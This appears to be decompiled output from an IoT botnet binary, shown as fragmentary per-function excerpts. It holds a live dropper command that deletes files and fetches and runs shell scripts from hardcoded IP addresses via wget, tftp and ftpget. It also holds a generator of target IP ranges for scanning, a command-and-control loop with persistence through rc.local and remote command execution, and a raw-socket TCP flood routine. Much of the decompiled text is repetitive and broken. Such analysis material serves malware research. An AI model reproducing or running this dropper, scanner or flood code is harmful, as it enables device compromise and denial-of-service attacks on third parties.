        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Rome Client (http://tinyurl.com/64t5n) Ver: 0.9",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
        "Rome Client (http://tinyurl.com/64t5n) Ver: 0.9",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3",
        "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
        "HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)",
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
        "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",
        "Wget/1.12 (linux-gnu)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3",
        "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
        "HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)",
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
        "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)",
        "wget",
        "botnet",
        "swatnet",
        "fucknet",
        "cracknet",
        "weednet",
        "gaynet",
        "queernet",
        "ballnet",
        "unet",
    char (*v76)[507] = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
        "telnet",
        "telnet"
        "telnet"
        "/dev/netslink/",
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 8865
++++++++ FUNCTION END 9665
++++++++ FUNCTION LENGTH 800
    int32_t v98 = rand(); // 0xab90
    int32_t v99 = rand(); // 0xabdc
    int32_t v100 = rand(); // 0xac28
    int32_t v101 = rand(); // 0xac74
    int32_t v102 = rand() % 115; // 0xacd8
        szprintf((int32_t)&v103, (int32_t)"43.252.%d.%d", (int32_t)v96, (int32_t)v97, 0);
        szprintf((int32_t)&v103, (int32_t)"43.239.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"85.3.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"37.158.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"95.9.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"41.252.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"58.71.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"104.55.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"78.186.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"78.189.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"77.209.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"88.5.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"43.239.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"103.20.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"103.47.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"103.57.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"45.117.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"101.51.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"137.59.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"1.56.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"1.188.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.204.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"27.0.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"27.8.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"27.50.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"27.54.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"27.98.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"27.112.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"27.192.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"36.32.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"36.248.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"39.64.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"42.4.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"42.48.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"42.52.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"42.56.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"42.63.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"42.84.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"42.176.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"42.224.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"42.176.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"60.0.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"60.16.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"163.53.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"62.30.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"62.252.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"62.254.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"62.255.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"77.96.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"77.97.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"77.98.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"77.100.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"77.102.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"113.191.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"81.100.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"113.188.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"113.189.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"94.174.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.160.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.161.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.162.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.163.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.164.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.165.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.166.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.167.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.168.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.169.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.170.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.171.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.172.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.173.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.174.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.175.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.176.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.177.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.178.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.179.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.180.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.181.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.182.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.183.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.184.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.185.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.186.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.187.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.188.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.189.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.190.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.191.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"45.121.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"45.120.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"45.115.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"43.252.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"43.230.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"43.240.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"43.245.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"41.174.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"49.118.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"78.188.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"45.127.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"103.30.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"14.33.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"123.16.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"202.44.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"116.93.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"91.83.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"41.253.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"117.173.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"113.190.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"146.88.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"112.196.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"113.178.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf((int32_t)&v103, (int32_t)"112.45.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
        szprintf(v105, (int32_t)"183.223.%d.%d", (int32_t)v96, (int32_t)v97, (int32_t)&v104);
    return inet_addr(v105);
=================FUNCTION : main ===================
++++++++ FUNCTION START 18365
++++++++ FUNCTION END 19077
++++++++ FUNCTION LENGTH 712
    srand(v90 ^ __GI_getpid());
    init_rand(v91 ^ __GI_getpid());
    int32_t v92 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x10e34
        v93 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        getcwd(v107, 256);
            __GI_fclose((int16_t *)v93);
            while (true) {
                    sprintf(v111, (int32_t)"\"%s%s\"\n", v107, v109 + len2, (int32_t)&v105, (int32_t)&v105, (int32_t)&v105);
                    while (true) {
                        while (true) {
                                fgets((int32_t)&v98, 1024, v93);
                                if (__GI_strcasecmp((char *)&v98, v111) == 0) {
                                __GI_fclose(v112);
                                int32_t v114 = __GI_fopen((int32_t)v94, (int32_t)&v113); // 0x10fbc
                                    __GI_fclose((int16_t *)v114);
                                getOurIP();
                                v101 = __libc_fork();
                                    if (__libc_fork() == 0) {
                                        zprintf((int32_t)"fork failed\n");
                                    while (true) {
                                        if (initConnection() != 0) {
                                            while (true) {
                                                if (initConnection() == 0) {
                                            getBuild();
                                            __GI_inet_ntoa(v115);
                                            sockprintf(v96, (int32_t)"Connected %s:%s");
                                            while (true) {
                                                while (true) {
                                                    if (recvLine(v96, (char *)&v99, 0x1000, v104) == -1) {
                                                    while (true) {
                                                                    if (__libc_waitpid(v123, 0, 1) >= 1) {
                                                                        while (true) {
                                                                                while (true) {
                                                                                        free();
                                                            if (strstr(v104, "PING") == v104) {
                                                                sockprintf(v96, (int32_t)"PONG");
                                                                if (strstr(v104, "DUP") == v104) {
                                                                    zprintf((int32_t)"PEACE OUT IMMA DUP\n");
                                                            while (true) {
                                                                if (initConnection() == 0) {
                                                            while (true) {
                                                            while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                                        while (true) {
                                                                                        processCmd(v149, &v110);
                                                                                    processCmd(v149, &v110);
                                                                                while (true) {
                                                                                    free();
                                                                                while (true) {
                                                        if (__libc_waitpid(v123, 0, 1) < 1) {
                                        getBuild();
                                        __GI_inet_ntoa(v115);
                                        sockprintf(v96, (int32_t)"Connected %s:%s");
                                    __libc_waitpid(v101, (int32_t)&v97, 0);
                                    zprintf((int32_t)"fork failed\n");
                                while (true) {
                                    if (initConnection() == 0) {
        getOurIP();
        v101 = __libc_fork();
            if (__libc_fork() == 0) {
                zprintf((int32_t)"fork failed\n");
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v101, (int32_t)&v97, 0);
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
    getOurIP();
    v101 = __libc_fork();
        if (__libc_fork() == 0) {
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v101, (int32_t)&v97, 0);
        zprintf((int32_t)"fork failed\n");
    while (true) {
        if (initConnection() == 0) {
    szprintf(v103, (int32_t)"%s 2>&1", v102, v103, (int32_t)&v105);
    int32_t v157 = fdpopen(v103, "r"); // 0x116f0
    while (true) {
        if (fdgets(v103, 1024, v157, v103) == 0) {
            fdpclose(v157);
            sockprintf(v96, (int32_t)"%s");
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 64676
++++++++ FUNCTION END 65426
++++++++ FUNCTION LENGTH 750
                    while (true) {
                        __open_nameservers();
                                v98 = socket((int32_t)v102, 2, 17);
                                    if (__libc_connect(v98, v103, 28) >= 0) {
                                        __libc_send(v98, v96, v130 + v132, v114);
                                        while (true) {
                                                int32_t result = __libc_recv(v98, v96, 512, 64, (int32_t)&v137); // 0x1b5ec
                                                                        __GI_close(v98);
                                                                        free();
                                                                        free();
                                                                            while (true) {
                                                                                                    while (true) {
                                                                                                                            free();
                                                                                                                                __GI_close(v98);
                                                                                                                                    free();
                                                                                                                                free();
                                                                                                                                    __GI_close(v98);
                                                                                                                                        free();
                                                                                                                                    free();
                                                                                                                                free();
                                                                                                                            __GI_close(v98);
                                                                                                                                free();
                                                                                                                            free();
                                                                                                                            __GI_close(v98);
                                                                                                                                free();
                                                                                                                            free();
                                                                                                                        __GI_close(v98);
                                                                                                                            free();
                                                                                                                        free();
                                                                                                            __GI_close(v98);
                                                                                                                free();
                                                                                                            free();
                                                                                                        __GI_close(v98);
                                                                                                    free();
                                                                                                    free();
                                                                                                __GI_close(v98);
                                                                                                    free();
                                                                                                free();
                                                                                                free();
                                                                    free();
                                                                    free();
                                                                __GI_close(v98);
                                                                free();
                                                                free();
                                                            __GI_close(v98);
                                                            free();
                                                            free();
            free();
            free();
        __GI_close(v98);
    free();
    free();
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 5172
++++++++ FUNCTION END 5578
++++++++ FUNCTION LENGTH 406
            v103 = __vfork();
                __GI_close(v99);
                __GI_close(v101);
                            __GI_close(v101);
                        __GI_close(v99);
                            __GI_close(v99);
                        __GI_close(v101);
                    __GI_close(v101);
                    __GI_close(v99);
        v102 = getdtablesize();
        v103 = __vfork();
            __GI_close(v99);
            __GI_close(v101);
                        __GI_close(v101);
                    __GI_close(v99);
                        __GI_close(v99);
                    __GI_close(v101);
                __GI_close(v101);
                __GI_close(v99);
        v103 = __vfork();
            __GI_close(v99);
            __GI_close(v101);
                        __GI_close(v101);
                    __GI_close(v99);
                        __GI_close(v99);
                    __GI_close(v101);
                __GI_close(v101);
                __GI_close(v99);
    v102 = getdtablesize();
    v103 = __vfork();
        __GI_close(v99);
        __GI_close(v101);
                    __GI_close(v101);
                __GI_close(v99);
                    __GI_close(v99);
                __GI_close(v101);
            __GI_close(v101);
            __GI_close(v99);
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 51964
++++++++ FUNCTION END 55785
++++++++ FUNCTION LENGTH 3821
                    while (true) {
                            while (true) {
                                while (true) {
                                while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                            while (true) {
                                            while (true) {
                while (true) {
            while (true) {
                while (true) {
            while (true) {
        while (true) {
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 44747
++++++++ FUNCTION END 46261
++++++++ FUNCTION LENGTH 1514
        while (true) {
            v110 = getuid();
            v111 = geteuid();
                v113 = getgid(v111);
                if (v113 == getegid()) {
                                while (true) {
                            while (true) {
                            while (true) {
                        while (true) {
                            while (true) {
                        while (true) {
                        while (true) {
                    while (true) {
                    while (true) {
                while (true) {
                while (true) {
            while (true) {
                    while (true) {
                while (true) {
                while (true) {
            while (true) {
                while (true) {
            while (true) {
            while (true) {
        while (true) {
        v110 = getuid();
        v111 = geteuid();
            v113 = getgid(v111);
            if (v113 == getegid()) {
                            while (true) {
                        while (true) {
                        while (true) {
                    while (true) {
                        while (true) {
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 11637
++++++++ FUNCTION END 11990
++++++++ FUNCTION LENGTH 353
        rand_cmwc();
    int32_t result = getHost(a1, &v96); // 0xe984
    int32_t v98 = socket(2, 3, 6); // 0xe9bc
        result2 = sockprintf(v99, (int32_t)"Failed opening raw socket.");
    if (__GI_setsockopt(v98, 0, 3, (int32_t)&v100, 4) < 0) {
        result2 = sockprintf(v99, (int32_t)"Failed setting raw headers mode.");
        makeIPPacket((char *)v104, v96, __GI_htonl(GetRandomIP(v101)), 6);
        *v106 = (int16_t)rand_cmwc();
        int32_t v107 = rand_cmwc(); // 0xeb14
                while (true) {
                        if (__GI_strcoll(v123, (int32_t)"rst") == 0) {
                                    if (__GI_strcoll(v123, (int32_t)"psh") == 0) {
